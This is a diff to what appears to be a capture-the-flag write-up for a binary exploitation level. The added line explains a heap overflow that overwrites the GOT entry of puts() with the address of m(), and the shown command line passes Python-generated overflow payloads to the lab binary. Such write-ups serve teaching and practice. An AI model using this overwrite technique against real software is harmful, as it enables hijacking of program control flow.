@@ -40,6 +40,7 @@ We need addr of `m()`, `puts()` and `the offset for puVar1[1]`
 * puts addr => 0x08049928
 * offset is 20
 
+We overflow the first strpcy with the addr of puts so when strcpy is call the second time it will write m() addr. Doing so replace all futur call to puts() by call to m()
 
 ```
 $ ./level7 $(python -c 'print "a"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
